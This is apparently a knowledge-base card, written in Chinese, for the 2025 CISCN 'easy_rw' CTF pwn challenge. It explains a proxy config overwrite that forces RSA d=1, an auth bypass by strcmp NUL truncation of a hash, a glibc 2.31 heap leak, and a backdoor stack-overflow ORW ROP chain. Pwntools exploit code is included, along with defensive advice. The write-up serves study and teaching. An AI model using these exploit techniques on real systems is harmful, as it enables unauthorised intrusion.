---
id: ctf-pwn-webpwn-proxy-config-overwrite-heap-leak-backdoor-orw
title: 2025 CISCN easy_rw：proxy 配置覆盖令 RSA d=1 + 哈希 NUL 截断绕过认证，后端 2.31 堆泄露与 backdoor 栈溢出 ORW
type: scenario
domain: ctf
path: ctf/pwn
technique: webpwn-proxy-config-overwrite-heap-leak-backdoor-orw
aliases:
- 2025 CISCN easy_rw
- webpwn easy_rw
- proxy 配置覆盖
- RSA d=1
- FNV1a BYTE2 清零
- strcmp NUL 截断
- 2.31 堆泄露
- backdoor ORW
tags:
- pwn
- ctf
- webpwn
- proxy
- rsa
- auth-bypass
- config-overwrite
- heap-leak
- stack-overflow
- rop
- orw
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T14:10:05+08:00'
  notes: 复核修正：config 覆盖 PoC 的 size 原写 0x110 小于实际 payload 长度（0x100 + 22 = 0x116），会截断 n=...&d=1 导致 refresh_config 失败；已改为 p32(len(payload))。其余与 91028 原文与 15 张图一致：n=ffffffffffffffff/d=1、FNV-1a64 BYTE2 清零与 NUL 截断、用户名 strcmp 三字节爆破、2.31 堆菜单泄露、backdoor 需非 rtsp:// 前缀触发、fd 需调试。与 91040 同题不同技术点并互链。PoC 未在本机复跑。
---

## 一句话结论

题目是 client → proxy → server 的 webpwn 架构：proxy 的“更新配置”分支可把 `n`/`d` 覆盖成 `n=0xffff...`、`d=1`，使 RSA 认证退化为恒等变换；认证比较的 `hash("hack")` 是 FNV-1a 变体且 `strcmp` 在 `\x00` 处截断，只需让前 3 字节匹配即可拿 cookie。进入 server 后，用户名检查同样被 `strcmp` 的 NUL 截断弱化为 3 字节爆破；再用 2.31 堆菜单泄露 heap/libc，最后用 backdoor 栈溢出 ROP `open/read/write` 读 flag。

## 原理

- **双进程架构**：对外只暴露 proxy（`0.0.0.0:8888`），server 监听 `127.0.0.1:7777`；客户端必须通过 proxy 的认证/cookie/协议转换才能触达 server。proxy 的协议头为 4 字节大端 choice + 4 字节大端 size + payload。
- **proxy 四个分支**：
  - `0xFFFF2525` 认证：RSA 解密挑战码并与 `hash("hack")` 比较，成功返回 32 字节 cookie；
  - `0x7F687985` 转发：前 32 字节 cookie 校验，之后转发给 server；
  - `0x85856547` 更新配置：把 payload `memcpy` 到全局缓冲区并写入 `config.txt`；
  - `0x85856546` 读取日志。
- **配置覆盖**：`0x85856547` 分支把最多 `0x1100` 字节拷贝到全局 `dest_`，`n`/`d` 全局变量就在相邻区域。发送 `padding + "n=ffffffffffffffff&d=1"`，`refresh_config` 解析后把 `n` 设为全 F、`d=1`。
- **RSA 退化**：`RSA(ciphertext, d, n)` 在 `d=1` 时就是 `ciphertext mod n`；只要 `n` 大于密文，结果等于密文本身。因此发送 `hash("hack")` 的二进制值即可通过。
- **哈希截断**：`hash` 是 FNV-1a64 变体，初始值 `0x14650FB0739D0383`、质数 `0x100000001B3`，并把 `BYTE2`（从低到高第 3 字节）清零；返回值里含有 `\x00`。认证比较用 `strncmp(s1, s, strlen(s))` 或 `strcmp`，遇到 NUL 提前结束，所以只需匹配 NUL 之前的 3 个字节；原文用 3 字节爆破/直接构造 `hash("hack")` 即可。
- **server 用户名检查**：`strcmp(hax_username, asc_5010)`，而 `asc_5010` 第 3 字节就是 `0x00`，所以只需要爆破/匹配前 3 字节哈希，后面的字节被忽略。
- **server 堆菜单**：add/delete/edit/show 的索引/长度/内容可控；原文用 2.31 堆上的菜单布局泄露 heap base 与 libc base（文中只给出 `show` 读 `Content: 144:` / `Content: 248:` 的结果，未展开具体堆布局）。
- **backdoor 栈溢出**：`backdoor()` 中有栈缓冲区溢出，拿到 libc 后可 ROP；由于是经 proxy 转发的间接连接，直接 `system("/bin/sh")` 不稳定，文章用 ORW（`open/read/write`）把 flag 写回 socket。
- **fd 细节**：程序打开/关闭多个文件、多个终端连接，`read`/`write` 的 fd 不是常规 0/1/2；需在调试中观察实际 fd（如 4/5），否则 ROP 的 read/write 会打错流。

## 触发条件

- 目标为 webpwn 题：proxy 暴露在外部，server 只能经 proxy 访问。
- proxy 配置更新分支存在全局缓冲区溢出，且 RSA 认证使用可被覆盖的全局 `n`/`d`。
- 认证/用户名比较使用 `strcmp`/`strncmp` 且被比较值含 `\x00`，可截断。
- server 存在可控堆菜单与堆泄露点、backdoor 栈溢出，且可通过 proxy 转发到达。
- 有目标 libc 版本/偏移，能构造 ROP；若 seccomp 限制 `execve`，需 ORW。

## 利用步骤

1. 识别 proxy 加壳（UPX），脱壳后恢复 `read_config/refresh_config/write_config/RSA/hash/proxy_handle` 等函数；确认协议头与四个 choice。
2. 发送 `choice=0x85856547`，payload 为填充 + `n=ffffffffffffffff&d=1`，覆盖全局 `n`/`d` 并写入 `config.txt`。
3. 计算 `hash("hack")`（FNV-1a64 变体、BYTE2 清零），发送 `choice=0xFFFF2525` + 8 字节大端哈希；`RSA(hash,1,n)=hash`，`strcmp` 在 NUL 截断处匹配，返回 32 字节 cookie。
4. 用 cookie 发 `choice=0x7F687985` 转发 server 命令，先爆破/匹配用户名 3 字节哈希，进入菜单。
5. 用 add/delete/edit/show 构造 2.31 堆布局，show 泄露 heap base 与 libc base；记录目标 libc 版本与偏移。
6. 通过 backdoor 发送超长 payload 覆盖返回地址（原文用 `aaaa://uH@*/` 这类非 `rtsp://` 前缀让 `url_parse` 失败，从而进入 `backdoor(input)`），ROP 调 `open("./flag")`、`read(fd, buf, n)`、`write(sockfd, buf, n)`；按调试得到的实际 fd 调整。
7. 接收 flag；若 read 阻塞/长度不对，调整分包与 payload 长度。

## PoC

proxy 配置覆盖与认证（偏移/长度按实际二进制调整）：

```python
from pwn import *

context.arch = 'amd64'
io = remote('target', 8888)

# 1) 覆盖全局 n/d
payload = b'a'*0x100 + b'n=ffffffffffffffff&d=1'
io.send(p32(0x85856547, endian='big') + p32(len(payload), endian='big') + payload)

# 2) 认证：发送 hash("hack")，d=1 时 RSA 退化为恒等
def fnv1a64(data):
    h = 0x14650FB0739D0383
    for b in data:
        h = ((h ^ b) * 0x100000001B3) & 0xFFFFFFFFFFFFFFFF
    h &= ~(0xFF << 16)      # BYTE2 = 0，制造 NUL 截断
    return h

io = remote('target', 8888)
io.send(p32(0xFFFF2525, endian='big') + p32(8, endian='big') +
        p64(fnv1a64(b'hack'), endian='big'))
cookie = io.recv(32)
```

server 侧 2.31 堆泄露与 backdoor ORW（示意）：

```python
# 经 proxy 转发：cookie + rtsp://... JSON
def forward(cmd):
    io = remote('target', 8888)
    io.send(p32(0x7F687985, endian='big') + p32(len(cookie)+len(cmd), endian='big') +
            cookie + cmd)
    return io

# show 索引泄露 heap/libc（具体索引按堆布局调整）
forward(b'rtsp://uH@*/{"command":"show","param1":"0","param2":"","param3":""}\n')

# backdoor 栈溢出 ROP：open/read/write（fd 需按调试结果调整）
rop  = flat(pop_rdi, flag_addr, pop_rsi, 0, libc.sym['open'])
rop += flat(pop_rdi, 4, pop_rsi, buf, pop_rdx, 0x40, libc.sym['read'])
rop += flat(pop_rdi, 4, pop_rsi, buf, pop_rdx, 0x40, libc.sym['write'])
payload = b'a'*offset + rop
forward(b'aaaa://uH@*/' + payload + b'\n')  # 解析失败才会进入 backdoor(input)
```

说明：原文最终通过 ORW 拿到 flag；具体堆布局、libc 偏移、fd 值与 ROP gadget 需按目标环境调试。PoC 未在本机复跑。

## 变体与关联

- **proxy 绕过变体**：覆盖 `n`/`d` 为 `d=1`/小值、`n` 大于密文；或泄露 `config.txt` 的 `n/d`；或利用 `strcmp`/`strncmp` 截断、哈希前缀碰撞。
- **后端泄露变体**：负索引 show、UAF、unsorted bin/tcache 指针、格式化字符串；2.31 需注意 tcache key/safe-linking。
- **收尾变体**：`system("/bin/sh")`、ORW、`sendfile`、SROP；seccomp 限制 `execve` 时用 ORW。
- **关联卡片**：[[ctf-pwn-webpwn-proxy-rsa-auth-bypass-backend-oob-rop]]（同题/同类 webpwn 的 proxy RSA 绕过 + 负索引 + memcpy_w 解法）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（堆泄露）、[[ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections]]（堆+栈组合）、[[crypto-hash-md5-digest-strcmp-nullbyte-truncation]]（strcmp NUL 截断）。
- **边界**：proxy 无溢出/认证比较完整哈希、server 无堆泄露或栈溢出、无法经 proxy 转发时链不成立；fd/偏移错误会导致 ROP 无输出。

## 检测与防御

- **认证实现**：RSA 验签必须比较完整哈希并使用常量时间比较；不要把私钥指数/模数放在可被缓冲区溢出覆盖的相邻全局区；配置解析限制写入长度。
- **内存安全**：所有 `memcpy` 做长度校验；栈缓冲区加 canary/FORTIFY；数组索引做上下界检查；开启 PIE/ASLR/NX。
- **架构隔离**：proxy 与 server 最小权限分离，proxy 不应把未验证的原始 payload 直接转发；后端只监听内部地址并做独立认证。
- **CTF 解题提示**：遇到 webpwn 先分清 proxy/server 与协议；先找 proxy 认证绕过，再找 server 泄露与溢出；注意加壳、fork 调试与 fd 值。
